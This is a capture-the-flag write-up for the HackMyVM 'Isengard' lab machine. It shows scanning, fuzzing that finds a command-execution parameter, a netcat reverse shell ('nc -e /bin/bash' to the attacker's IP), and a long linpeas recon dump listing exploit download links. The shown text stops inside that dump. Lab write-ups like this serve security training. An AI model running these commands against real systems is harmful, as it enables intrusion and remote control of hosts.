---
layout: post
title: "HackMyVM - Isengard"
date: 2022-03-31 15:47:00 +0100
categories: hmv
tag: ["RCE", "LFI"]
---

Creator : [bit](https://hackmyvm.eu/profile/?user=bit)
Level: Easy
Release Date: 2021-11-12

## Scan

```bash
$ nmap -sC -sV -p- 192.168.1.137 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-31 11:37 WEST
Nmap scan report for 192.168.1.137
Host is up (0.00043s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Gray wizard
|_http-server-header: Apache/2.4.51 (Debian)
```

### Enumeration

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.1.137 -x txt,php,html,zip,htm,bak 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.137
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              bak,txt,php,html,zip,htm
[+] Timeout:                 10s
===============================================================
2022/03/31 11:41:03 Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.hta.zip             (Status: 403) [Size: 278]
/.hta.htm             (Status: 403) [Size: 278]
/.hta.bak             (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.zip        (Status: 403) [Size: 278]
/.htaccess.zip        (Status: 403) [Size: 278]
/.htpasswd.htm        (Status: 403) [Size: 278]
/.htaccess.htm        (Status: 403) [Size: 278]
/.htpasswd.bak        (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 426]
/index.html           (Status: 200) [Size: 426]
/server-status        (Status: 403) [Size: 278]
                                               
===============================================================
2022/03/31 11:41:12 Finished
===============================================================
```

From webpage source code: http://192.168.1.137/main.css

```txt
/* btw: in the robots.txt i have to put the url /y0ush4lln0tp4ss */
```

### Directories

```bash
$ feroxbuster -e -x txt,php,html,zip,htm,bak -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.1.137/y0ush4lln0tp4ss/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.6.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.137/y0ush4lln0tp4ss/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.6.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, zip, htm, bak]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       16l       22w      250c http://192.168.1.137/y0ush4lln0tp4ss/index.html
200      GET      118l      759w    44300c http://192.168.1.137/y0ush4lln0tp4ss/l00kt0myc00ming.jpg
200      GET       16l       22w      250c http://192.168.1.137/y0ush4lln0tp4ss/
403      GET        9l       28w      278c http://192.168.1.137/y0ush4lln0tp4ss/.php
403      GET        9l       28w      278c http://192.168.1.137/y0ush4lln0tp4ss/.html
403      GET        9l       28w      278c http://192.168.1.137/y0ush4lln0tp4ss/.htm
301      GET        9l       28w      329c http://192.168.1.137/y0ush4lln0tp4ss/east => http://192.168.1.137/y0ush4lln0tp4ss/east/
200      GET      134l      961w    51658c http://192.168.1.137/y0ush4lln0tp4ss/east/speakfriendandenter.jpg
200      GET       20l       27w      285c http://192.168.1.137/y0ush4lln0tp4ss/east/index.html
200      GET       30l      142w     6042c http://192.168.1.137/y0ush4lln0tp4ss/east/ring.zip
[####>---------------] - 3m    596202/2906876 15m     found:10      errors:0      
[####>---------------] - 3m    323946/1453403 1371/s  http://192.168.1.137/y0ush4lln0tp4ss/ 
[###>----------------] - 3m    271957/1453403 1262/s  http://192.168.1.137/y0ush4lln0tp4ss/east 
```

### Files

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.1.137/y0ush4lln0tp4ss/east/ -x txt,php,html,zip,htm,bak,jpg
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.137/y0ush4lln0tp4ss/east/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,zip,htm,bak,jpg,txt,php
[+] Timeout:                 10s
===============================================================
2022/03/31 11:53:33 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 285]
/ring.zip             (Status: 200) [Size: 6042]
/mellon.php           (Status: 200) [Size: 0]   
                                                
===============================================================
2022/03/31 12:01:45 Finished
===============================================================
```

### Arguments

```bash
$ wfuzz -t 500 -c -z file,/usr/share/seclists/Discovery/Web-Content/big.txt --hh BBB $IP/y0ush4lln0tp4ss/east/mellon.php?FUZZ{test}=id

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.137/y0ush4lln0tp4ss/east/mellon.php?FUZZ=id
Total requests: 20476

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================

000000001:   200        0 L      0 W        0 Ch        "test"                                                                                                
000008058:   200        1 L      3 W        54 Ch       "frodo"                                                                                               

Total time: 0
Processed Requests: 20277
Filtered Requests: 20275
Requests/sec.: 0
```

* http://192.168.1.137/y0ush4lln0tp4ss/east/mellon.php?frodo=id

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

```
http://192.168.1.137/y0ush4lln0tp4ss/east/mellon.php?frodo=nc -e /bin/bash 192.168.1.6 5555
```

### Stable Shell 

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
2xENTER
```

### System Recon (linpeas.sh)

```python
$ ./linpeas.sh 

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                    
                                                                                                                                                                       
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                               
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                                
                                         ╚═══════════════════╝                                                                                                         
OS: Linux version 5.10.0-9-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.70-1 (2021-09-30)
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: isengard
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                      
                                                                                                                                                                       

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE
                                                                                                                                                                       
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                                 
                                        ╚════════════════════╝                                                                                                         
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                          
Linux version 5.10.0-9-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.70-1 (2021-09-30)
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                             
Sudo version 1.9.5p2                                                                                                                                                   

Unit polkit.service could not be found.
./linpeas.sh: 1189: [[: not found
./linpeas.sh: 1189: rpm: not found
./linpeas.sh: 1189: 0: not found
./linpeas.sh: 1199: [[: not found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                           
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Thu Mar 31 07:20:53 EDT 2022                                                                                                                                           
 07:20:53 up 45 min,  0 users,  load average: 0.15, 0.18, 1.12

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                   
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                                                                             
UUID=849513d9-d46c-45e0-ae4c-08edecd226b2 /               ext4    errors=remount-ro 0       1                                                                          
UUID=61eb11e2-5674-4394-9118-fb4a152b6ab7 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                
HISTFILESIZE=0                                                                                                                                                         
SHLVL=2
OLDPWD=/tmp
LC_CTYPE=C.UTF-8
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=8:11223
_=./linpeas.sh
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=0a7fd3c961cb4bbe833d63cf608c23d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/dev/shm
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                      
dmesg Not Found                                                                                                                                                        
                                                                                                                                                                       
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                     
cat: write error: Broken pipe                                                                                                                                          
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                
                                                                                                                                                                       
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                          
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                      
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                               
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                 
═╣ Is ASLR enabled? ............... Yes                                                                                                                                
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (oracle)                                                                                                                       

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                                                
                                             ╚═══════════╝                                                                                                             
╔══════════╣ Container related tools present
╔══════════╣ Container details                                                                                                                                         
═╣ Is this a container? ........... No                                                                                                                                 
═╣ Any running containers? ........ No                                                                                                                                 
                                                                                                                                                                       

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                                                 
                          ╚════════════════════════════════════════════════╝                                                                                           
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                 
root           1  0.0  1.0  98304 10008 ?        Ss   06:35   0:01 /sbin/init                                                                                          
root         182  0.0  0.9  31912  9908 ?        Ss   06:35   0:00 /lib/systemd/systemd-journald
root         204  0.0  0.5  21792  5432 ?        Ss   06:35   0:00 /lib/systemd/systemd-udevd
systemd+     229  0.0  0.6  88376  6136 ?        Ssl  06:35   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         289  0.0  0.2   6684  2788 ?        Ss   06:35   0:00 /usr/sbin/cron -f
message+     290  0.0  0.4   8192  4148 ?        Ss   06:35   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         291  0.0  0.5  99824  5828 ?        Ssl  06:35   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
root         313  0.0  0.6 220740  6092 ?        Ssl  06:35   0:00 /usr/sbin/rsyslogd -n -iNONE
root         314  0.0  0.5  21536  5584 ?        Ss   06:35   0:00 /lib/systemd/systemd-logind
root         362  0.0  0.1   5784  1736 tty1     Ss+  06:35   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         390  0.0  2.0 194344 20764 ?        Ss   06:35   0:00 /usr/sbin/apache2 -k start
www-data     559  1.2  1.4 194860 14740 ?        S    06:56   0:18  _ /usr/sbin/apache2 -k start
www-data     693  0.0  1.4 194852 14744 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     828  0.0  0.0   2420   588 ?        S    07:11   0:00  |   _ sh -c nc -e /bin/bash 192.168.1.6 5555
www-data     829  0.0  0.2   3836  2956 ?        S    07:11   0:00  |       _ bash
www-data     835  0.0  0.8  15268  8072 ?        S    07:14   0:00  |           _ python3 -c import pty;pty.spawn("/bin/bash")
www-data     836  0.0  0.3   7440  3612 pts/0    Ss   07:14   0:00  |               _ /bin/bash
www-data     861  0.5  0.2   3488  2564 pts/0    S+   07:20   0:00  |                   _ /bin/sh ./linpeas.sh
www-data    3505  0.0  0.1   3488  1080 pts/0    S+   07:20   0:00  |                       _ /bin/sh ./linpeas.sh
www-data    3509  0.0  0.3  10188  3216 pts/0    R+   07:20   0:00  |                       |   _ ps fauxwww
www-data    3508  0.0  0.1   3488  1080 pts/0    S+   07:20   0:00  |                       _ /bin/sh ./linpeas.sh
www-data     694  0.0  1.4 194852 14720 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     697  0.0  1.3 194852 13252 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     698  0.0  1.3 194852 13252 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     699  0.0  1.3 194852 13252 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     700  0.0  1.3 194852 13252 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     704  0.0  1.3 194852 13252 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     717  0.0  1.3 194852 13252 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data     742  0.0  1.4 194852 14744 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                
                                                                                                                                                                       
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                     
COMMAND    PID TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                                                               

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                          
gdm-password Not Found                                                                                                                                                 
gnome-keyring-daemon Not Found                                                                                                                                         
lightdm Not Found                                                                                                                                                      
vsftpd Not Found                                                                                                                                                       
apache2 process found (dump creds from memory as root)                                                                                                                 
sshd Not Found
                                                                                                                                                                       
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                      
/usr/bin/crontab                                                                                                                                                       
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 22  2021 /etc/crontab                                                                                                               

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Nov 11 15:13 .
drwxr-xr-x 68 root root 4096 Mar 31 06:35 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
-rw-r--r--  1 root root  712 May 11  2020 php

/etc/cron.daily:
total 32
drwxr-xr-x  2 root root 4096 Nov 11 08:00 .
drwxr-xr-x 68 root root 4096 Mar 31 06:35 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 Jun 10  2021 apt-compat
-rwxr-xr-x  1 root root 1298 Jan 30  2021 dpkg
-rwxr-xr-x  1 root root  377 Feb 28  2021 logrotate
-rwxr-xr-x  1 root root 1123 Feb 19  2021 man-db

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov 11 07:23 .
drwxr-xr-x 68 root root 4096 Mar 31 06:35 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Nov 11 07:23 .
drwxr-xr-x 68 root root 4096 Mar 31 06:35 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Nov 11 07:26 .
drwxr-xr-x 68 root root 4096 Mar 31 06:35 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
-rwxr-xr-x  1 root root  813 Feb 19  2021 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                      

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                                 
You can't write on systemd PATH                                                                                                                                        

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                   
NEXT                        LEFT        LAST                        PASSED               UNIT                         ACTIVATES                                        
Thu 2022-03-31 07:39:00 EDT 17min left  Thu 2022-03-31 07:09:37 EDT 11min ago            phpsessionclean.timer        phpsessionclean.service
Thu 2022-03-31 14:49:35 EDT 7h left     Thu 2021-11-11 07:29:21 EST 4 months 18 days ago apt-daily.timer              apt-daily.service
Fri 2022-04-01 00:00:00 EDT 16h left    Thu 2022-03-31 06:35:13 EDT 45min ago            logrotate.timer              logrotate.service
Fri 2022-04-01 00:00:00 EDT 16h left    Thu 2022-03-31 06:35:13 EDT 45min ago            man-db.timer                 man-db.service
Fri 2022-04-01 06:15:42 EDT 22h left    Thu 2022-03-31 06:59:49 EDT 21min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service
Fri 2022-04-01 06:50:49 EDT 23h left    Thu 2022-03-31 06:50:49 EDT 30min ago            systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2022-04-03 03:10:30 EDT 2 days left Tue 2022-03-29 17:24:56 EDT 1 day 13h ago        e2scrub_all.timer            e2scrub_all.service
Mon 2022-04-04 01:37:55 EDT 3 days left Thu 2022-03-31 07:16:59 EDT 4min 7s ago          fstrim.timer                 fstrim.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                   
                                                                                                                                                                       
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                  
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket                                                                     
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                  
/run/dbus/system_bus_socket                                                                                                                                            
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                    
                                                                                                                                                                       
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                    
NAME                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION DESCRIPTION                                            
:1.0                       229 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -
:1.1                         1 systemd         root             :1.1          init.scope                -       -
:1.2                       314 systemd-logind  root             :1.2          systemd-logind.service    -       -
:1.9                      5489 busctl          www-data         :1.9          apache2.service           -       -
org.freedesktop.DBus         1 systemd         root             -             init.scope                -       -
org.freedesktop.hostname1    - -               -                (activatable) -                         -       -
org.freedesktop.locale1      - -               -                (activatable) -                         -       -
org.freedesktop.login1     314 systemd-logind  root             :1.2          systemd-logind.service    -       -
org.freedesktop.network1     - -               -                (activatable) -                         -       -
org.freedesktop.resolve1     - -               -                (activatable) -                         -       -
org.freedesktop.systemd1     1 systemd         root             :1.1          init.scope                -       -
org.freedesktop.timedate1    - -               -                (activatable) -                         -       -
org.freedesktop.timesync1  229 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                                
                                        ╚═════════════════════╝                                                                                                        
╔══════════╣ Hostname, hosts and DNS
isengard                                                                                                                                                               
127.0.0.1       localhost
127.0.1.1       isengard

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 192.168.1.1
nameserver 62.169.70.160

╔══════════╣ Interfaces
default         0.0.0.0                                                                                                                                                
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:46:ce:b1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.137/24 brd 192.168.1.255 scope global dynamic enp0s3
       valid_lft 83648sec preferred_lft 83648sec
    inet6 fe80::a00:27ff:fe46:ceb1/64 scope link 
       valid_lft forever preferred_lft forever

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                               
tcp   LISTEN 0      511                *:80              *:*                                                                                                           

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                     
                                                                                                                                                                       


                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                                
                                         ╚═══════════════════╝                                                                                                         
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                    
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                  

╔══════════╣ Do I have PGP keys?
gpg Not Found                                                                                                                                                          
netpgpkeys Not Found                                                                                                                                                   
netpgp Not Found                                                                                                                                                       
                                                                                                                                                                       
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
                                                                                                                                                                       
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                      
ptrace protection is disabled (0)                                                                                                                                      
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                  
                                                                                                                                                                       
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                        

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                        
sauron:x:1000:1000:sauron,,,:/home/sauron:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                 
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(sauron) gid=1000(sauron) groups=1000(sauron),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev)
uid=101(systemd-timesync) gid=101(systemd-timesync) groups=101(systemd-timesync)
uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
